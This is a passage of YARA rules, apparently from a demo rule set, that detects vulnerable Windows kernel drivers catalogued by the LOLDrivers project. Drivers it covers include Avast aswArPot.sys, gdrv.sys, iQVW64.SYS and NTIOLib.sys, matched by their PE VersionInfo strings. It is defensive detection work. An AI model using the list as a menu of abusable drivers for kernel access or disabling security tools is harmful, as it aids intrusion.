them\n}\n\nrule PUA_VULN_Driver_Zemanaltd_Zam_45F4_RID332E : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - zam64.sys, zamguard32.sys, zamguard64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 14:36:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005a0041004d } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005a0065006d0061006e00610020004c00740064002e } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e00320030002e003800360035 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005a0041004d } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]005a0065006d0061006e00610020004c00740064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Intelcorporation_Iqvwsys_Intelriqvwsys_4D05_RID3E05 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - iQVW64.SYS\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:19:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0049006e00740065006c0028005200290020004e006500740077006f0072006b0020004100640061007000740065007200200044006900610067006e006f00730074006900630020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0049006e00740065006c00200043006f00720070006f0072006100740069006f006e0020 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e00300033002e0030002e00340020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e00300033002e0030002e0034 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006900510056005700360034002e005300590053 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0049006e00740065006c0028005200290020006900510056005700360034002e005300590053 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006900510056005700360034002e005300590053 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300032002d003200300030003600200049006e00740065006c00200043006f00720070006f0072006100740069006f006e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Avastsoftware_Aswarpotsys_Avastantivirus_86A1_RID3EC0 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - aswArPot.sys, avgArPot.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:50:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0041007600610073007400200061006e0074006900200072006f006f0074006b00690074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041005600410053005400200053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310038002e0038002e0034003000350037002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310038002e0038002e0034003000350037002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0041007600610073007400200041006e00740069007600690072007500730020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028006300290020003200300031003800200041005600410053005400200053006f006600740077006100720065 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Trendmicroinc_Tmcommsys_Aegis_61BE_RID39D6 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - TmComm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 19:20:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005400720065006e0064004d006900630072006f00200043006f006d006d006f006e0020004d006f00640075006c0065 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e0035002e0030002e0031003100300036 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0035 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00410045004700490053 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300035002d00320030003000380020005400720065006e00640020004d006900630072006f00200049006e0063006f00720070006f00720061007400650064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Windowsrserverddkprovider_Gdrvsys_Windowsrserverddkdriver_8899_RID45FB : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - gdrv.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 03:59:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0047004900470041004200590054004500200054006f006f006c0073 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00570069006e0064006f007700730020002800520029002000530065007200760065007200200032003000300033002000440044004b002000700072006f00760069006400650072 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0035002e0032002e0033003700390030002e00310038003300300020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0035002e0032002e0033003700390030002e0031003800330030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0067006400720076002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00570069006e0064006f007700730020002800520029002000530065007200760065007200200032003000300033002000440044004b0020006400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0067006400720076002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00a90020004d006900630072006f0073006f0066007400200043006f00720070006f0072006100740069006f006e002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Filseclabcorporation_Fildds_Filseclabdynamicdefensesystem_F8C0_RID4547 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - fildds.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 03:29:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00460069006c007300650063006c00610062002000440079006e0061006d0069006300200044006500660065006e00730065002000530079007300740065006d0020004400720076 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00460069006c007300650063006c0061006200200043006f00720070006f0072006100740069006f006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0032002c00200030002c00200030002c00200038003500350033 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002c00200030002c00200030002c00200038003500350033 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00660069006c006400640073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00460069006c007300650063006c00610062002000440079006e0061006d0069006300200044006500660065006e00730065002000530079007300740065006d } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00660069006c006400640073002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300032002d0032003000310031002000460069006c007300650063006c0061006200200043006f00720070006f0072006100740069006f006e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Avastsoftware_Aswarpotsys_Avastantivirus_BE8D_RID3EE3 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - aswArPot.sys, avgArPot.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:56:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0041007600610073007400200061006e0074006900200072006f006f0074006b00690074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041005600410053005400200053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310038002e0034002e0033003800390031002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310038002e0034002e0033003800390031002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0041007600610073007400200041006e00740069007600690072007500730020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028006300290020003200300031003800200041005600410053005400200053006f006600740077006100720065 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Elaboratebytesag_Elbycdio_Cdrtools_3E85_RID3BBA : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - elbycdio.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:41:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0045006c0062007900430044002000570069006e0064006f00770073002000780036003400200049002f004f0020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002c00200030002c00200030002c00200032 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002c00200030002c00200030002c00200030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0045006c00620079004300440049004f } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0043004400520054006f006f006c0073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0045006c00620079004300440049004f002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003000300020002d0020003200300030003700200045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Msi_Ntiolibsys_Ntiolib_3070_RID36D6 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - NTIOLib.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 17:12:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004d0053004900200043006f006d00430065006e00530065007200760069006300650020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004d00530049 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004e00540049004f004c00690062002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e00540049004f004c00690062 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004e00540049004f004c00690062002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003100330020004d00530049002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Msi_Ntiolibsys_Ntiolib_CC58_RID36FF : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - NTIOLib.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 17:19:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e00540049004f004c00690062 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004d00530049 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0030002e0031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0030002e0031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004e00540049004f004c00690062002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e00540049004f004c00690062 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004e00540049004f004c00690062005f005800360034002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003100350020004d00530049002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Windowsrcodenamelonghornddkprovider_Rtkiosys_Windowsrcodenamelonghornddkdriver_916C_RID4E8A : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - rtkio.sys, rtkio64.sys, rtkiow8x64.sys, rtkiow10x64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 08:48:26\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005200650061006c00740065006b00200049004f004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00570069006e0064006f00770073002000280052002900200043006f00640065006e0061006d00650020004c006f006e00670068006f0072006e002000440044004b002000700072006f00760069006400650072 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e0030002e0036003000300030002e003100360033003800360020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e0030002e0036003000300030002e00310036003300380036 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00720074006b0069006f002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00570069006e0064006f00770073002000280052002900200043006f00640065006e0061006d00650020004c006f006e00670068006f0072006e002000440044004b0020006400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00720074006b0069006f002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00a90020004d006900630072006f0073006f0066007400200043006f00720070006f0072006100740069006f006e002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Nmscommunications_Cgkwinksys_Ctaccess_223F_RID3D2C : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - cg6kwin2k.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:43:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00430047002f004d0047002000660061006d0069006c00790020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004e004d005300200043006f006d006d0075006e00690063006100740069006f006e0073 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e003000300020006200750069006c0074002000620079003a002000410064006d0069006e006900730074007200610074006f0072 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e00300030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006300670036006b00770069006e0032006b002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004300540020004100630063006500730073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006300670036006b00770069006e0032006b002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028004300290020004e004d005300200043006f006d006d0075006e00690063006100740069006f006e007300200043006f00720070002e0032003000300034 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Trendmicroinc_Tmcommsys_Trendmicroeyes_E4D9_RID3DC2 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - TmComm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:08:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005400720065006e0064004d006900630072006f00200043006f006d006d006f006e0020004d006f00640075006c0065 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e00350030002e0030002e0031003000350038 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e00350030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200045007900650073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003100350020005400720065006e00640020004d006900630072006f00200049006e0063006f00720070006f00720061007400650064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule PUA_VULN_Driver_Insydesoftwarecorp_Segwindrvxsys_Segwindowsdriverx_B9AE_RID432C : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - segwindrvx64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 01:59:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005300450047002000570069006e0064006f0077007300200044007200690076006500720020007800360034 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0049006e007300790064006500200053006f00660074007700610072006500200043006f00720070002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]003100300030002e00300030002e00300037002e00300031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]003100300030002e00300030002e00300037002e00300031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00730065006700770069006e006400720076007800360034002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005300450047002000570069006e0064006f0077007300200044007200690076006500720020007800360034 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00730065006700770069006e006400720076007800360034002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800630029002000320030003100320020002d00200032003000310034002c00200049006e007300790064006500200053006f00660074007700610072006500200043006f00720070002e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Windowsrwinddkprovider_Cupfixerxsys_Windowsrwinddkdriver_8C74_RID4598 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - CupFixerx64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 03:42:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00530069006e0063006500790020004300750070002000460069007800650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00570069006e0064006f007700730020002800520029002000570069006e00200037002000440044004b002000700072006f00760069006400650072 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00330032002e0030002e00310030003000310031002e00310033003300330037 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00330032002e0030002e00310030003000310031002e00310033003300330037 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00430075007000460069007800650072007800360034002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00570069006e0064006f007700730020002800520029002000570069006e00200037002000440044004b0020006400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00430075007000460069007800650072007800360034002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00a90020004d006900630072006f0073006f0066007400200043006f00720070006f0072006100740069006f006e002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Advancedmicrodevicesinc_Pdfwkrnlsys_Usbcpowerdeliveryfirmwareupdatetoolkerneldriver_0CF8_RID5090 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - PDFWKRNL.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 08:57:04\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005500530042002d004300200050006f007700650072002000440065006c006900760065007200790020004600690072006d0077006100720065002000550070006400610074006500200054006f006f006c0020004b00650072006e0065006c0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041006400760061006e0063006500640020004d006900630072006f00200044006500760069006300650073002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0050004400460057004b0052004e004c002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005500530042002d004300200050006f007700650072002000440065006c006900760065007200790020004600690072006d0077006100720065002000550070006400610074006500200054006f006f006c0020004b00650072006e0065006c0020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0050004400460057004b0052004e004c002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028004300290020003200300032003100200041006400760061006e0063006500640020004d006900630072006f00200044006500760069006300650073002c00200049006e0063002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Asustekcomputerinc_Eiosys_Asusvgakernelmodedriver_B175_RID4252 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - EIO.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 01:22:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004100530055005300200056004700410020004b00650072006e0065006c0020004d006f006400650020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004100530055005300540065004b00200043006f006d0070007500740065007200200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e00390036 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e00390036 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00450049004f002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004100530055005300200056004700410020004b00650072006e0065006c0020004d006f006400650020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00450049004f002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000320030003000370020004100530055005300540065004b00200043006f006d0070007500740065007200200049006e0063002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Nvidiacorp_Nvoclocksys_Nvidiasystemutilitydriver_4D77_RID4215 : DEMO EXE FILE {\n   meta:\n      description = 